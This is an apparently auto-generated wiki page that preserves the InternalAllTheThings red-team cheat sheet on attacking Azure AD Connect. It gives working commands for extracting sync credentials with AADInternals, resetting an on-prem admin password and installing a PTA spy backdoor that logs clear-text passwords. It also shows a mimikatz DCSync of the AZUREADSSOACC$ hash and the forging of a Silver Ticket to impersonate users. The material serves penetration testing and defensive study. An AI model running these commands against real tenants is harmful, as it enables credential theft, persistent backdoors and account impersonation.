---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure AD - AD Connect and Cloud Sync

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-ad-connect` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-ad-connect.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure AD - AD Connect and Cloud Sync](../../topics/cloud/azure-ad-ad-connect-and-cloud-sync.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-ad-connect |
| name | Azure AD - AD Connect and Cloud Sync |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-ad-connect.md |

## Preserved Source Material

````yaml
_body: "# Azure AD - AD Connect and Cloud Sync\n\n| Active Directory                  | Azure AD          |\n|-----------------------------------|-------------------|\n\
  | LDAP                              | REST API'S        |\n| NTLM/Kerberos                     | OAuth/SAML/OpenID |\n|\
  \ Structured directory (OU tree)    | Flat structure    |\n| GPO                               | No GPO's          |\n|\
  \ Super fine-tuned access controls  | Predefined roles  |\n| Domain/forest                     | Tenant            |\n|\
  \ Trusts                            | Guests            |\n\nCheck if Azure AD Connect is installed : `Get-ADSyncConnector`\n\
  \n* For **PHS**, we can extract the credentials\n    * Passwords from on-premise AD are sent to the cloud\n    * Use replication\
  \ via a service account created by AD Connect\n* For **PTA**, we can attack the agent\n    * Possible to perform DLL injection\
  \ into the PTA agent and intercept authentication requests: credentials in clear-text\n* For **Federation**, connect Windows\
  \ Server AD to Azure AD using Federation Server (ADFS)\n    * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password\n\
  \    * extract the certificate from ADFS server using DA\n\n## Password Hash Synchronization\n\nGet token for `SYNC_*` account\
  \ and reset on-prem admin password\n\n```powershell\nPS > Import-Module C:\\Users\\Administrator\\Documents\\AADInternals\\\
  AADInternals.psd1\nPS > Get-AADIntSyncCredentials\n\nPS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force\n\
  PS > $creds = New-Object System.Management.Automation.PSCredential (\"<Username>@<TenantName>.onmicrosoft.com\", $passwd)\n\
  PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache\n\nPS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com\
  \ | select ImmutableId\nPS > Set-AADIntUserPassword -SourceAnchor \"<IMMUTABLE-ID>\" -Password \"Password\" -Verbose\n```\n\
  \n## Pass-Through Authentication\n\n1. Check if PTA is installed : `Get-Command -Module PassthroughAuthPSModule`\n2. Install\
  \ a PTA Backdoor\n\n    ```powershell\n    PS AADInternals> Install-AADIntPTASpy\n    PS AADInternals> Get-AADIntPTASpyLog\
  \ -DecodePasswords\n    ```\n\n## Federation\n\n* [Golden SAML](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adfs-federation-services/)\n\
  \n## AD Connect - Credentials\n\n* [dirkjanm/adconnectdump](https://github.com/dirkjanm/adconnectdump) - Dump Azure AD Connect\
  \ credentials for Azure AD and Active Directory\n\n| Tool | Requires code execution on target | DLL dependencies | Requires\
  \ MSSQL locally | Requires python locally |\n| --- | --- | --- | --- | --- |\n| ADSyncDecrypt | Yes | Yes | No | No |\n\
  | ADSyncGather | Yes | No | No | Yes |\n| ADSyncQuery | No (network RPC calls only) | No | Yes | Yes |\n\n* **ADSyncDecrypt**:\
  \ Decrypts the credentials fully on the target host. Requires the AD Connect DLLs to be in the PATH. A similar version in\
  \ PowerShell was released by Adam Chester on his blog.\n* **ADSyncGather**: Queries the credentials and the encryption keys\
  \ on the target host, decryption is done locally (python). No DLL dependencies.\n* **ADSyncQuery**: Queries the credentials\
  \ from the database that is saved locally. Requires MSSQL LocalDB to be installed. No DLL dependencies. Is called from adconnectdump.py,\
  \ dumps data without executing anything on the Azure AD connect host.\n\nCredentials in ADSync : `C:\\Program Files\\Microsoft\
  \ Azure AD Sync\\Data\\ADSync.mdf`\n\n## AD Connect - DCSync with MSOL Account\n\nYou can perform **DCSync** attack using\
  \ the MSOL account.\n\nRequirements:\n\n* Compromise a server with Azure AD Connect service\n* Access to ADSyncAdmins or\
  \ local Administrators groups\n\nUse the script **azuread_decrypt_msol.ps1** from @xpn to recover the decrypted password\
  \ for the MSOL account:\n\n* [xpn/azuread_decrypt_msol.ps1](https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545):\
  \ AD Connect Sync Credential Extract POC\n* [xpn/azuread_decrypt_msol_v2.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c):\
  \ Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync\n\nNow you can\
  \ use the retrieved credentials for the MSOL Account to launch a DCSync attack.\n\n## AD Connect - Seamless Single Sign\
  \ On Silver Ticket\n\nAnyone who can edit properties of the `AZUREADSSOACCS$` account can impersonate any user in Azure\
  \ AD using Kerberos (if no MFA)\n\nSeamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer\
  \ account **AZUREADSSOC** is created in the on-prem AD.\n\n:warning: The password of the AZUREADSSOACC account never changes.\n\
  \nUsing [https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com/) to convert Kerberos tickets\
  \ to SAML and JWT for Office 365 & Azure\n\n1. NTLM password hash of the AZUREADSSOACC account, e.g. `f9969e088b2c13d93833d0ce436c76dd`.\n\
  \n    ```powershell\n    mimikatz.exe \"lsadump::dcsync /user:AZUREADSSOACC$\" exit\n    ```\n\n2. AAD logon name of the\
  \ user we want to impersonate, e.g. `elrond@contoso.com`. This is typically either his userPrincipalName or mail attribute\
  \ from the on-prem AD.\n3. SID of the user we want to impersonate, e.g. `S-1-5-21-2121516926-2695913149-3163778339-1234`.\n\
  4. Create the Silver Ticket and inject it into Kerberos cache:\n\n    ```powershell\n    mimikatz.exe \"kerberos::golden\
  \ /user:elrond\n    /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234\n    /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd\n\
  \    /target:aadg.windows.net.nsatc.net /service:HTTP /ptt\" exit\n    ```\n\n5. Launch Mozilla Firefox\n6. Go to about:config\
  \ and set the `network.negotiate-auth.trusted-uris preference` to value `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`\n\
  7. Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password\
  \ field empty.\n\n## References\n\n* [Azure AD connect for RedTeam - Adam Chester @xpnsec - February 18, 2019](https://blog.xpnsec.com/azuread-connect-for-redteam/)\n\
  * [Azure AD Kerberos Tickets: Pivoting to the Cloud - Edwin David - February 9, 2023](https://trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud)\n\
  * [Azure AD Overview - John Savill's Technical Training - Oct 7, 2014](https://www.youtube.com/watch?v=l_pnNpdxj20)\n* [DUMPING\
  \ NTHASHES FROM MICROSOFT ENTRA ID - Secureworks](https://www.secureworks.com/research/dumping-nthashes-from-microsoft-entra-id)\n\
  * [Impersonating Office 365 Users With Mimikatz - Michael Grafnetter - January 15, 2017](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)\n\
  * [Introduction to Microsoft Entra Connect V2 - Microsoft](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-azure-ad-connect-v2)\n\
  * [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory - Dirk-jan Mollema - 1st apr.\
  \ 2019](https://www.youtube.com/watch?v=JEIR5oGCwdg)\n* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)\n\
  * [Update: Dumping Entra Connect Sync Credentials - @hotnops - June 10, 2025](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71)\n\
  * [Windows Azure Active Directory in plain English - Openness AtCEE - January 9, 2014](https://www.youtube.com/watch?v=IcSATObaQZE)"
_relative_path: cloud/azure/azure-ad-connect.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-ad-connect.md
````
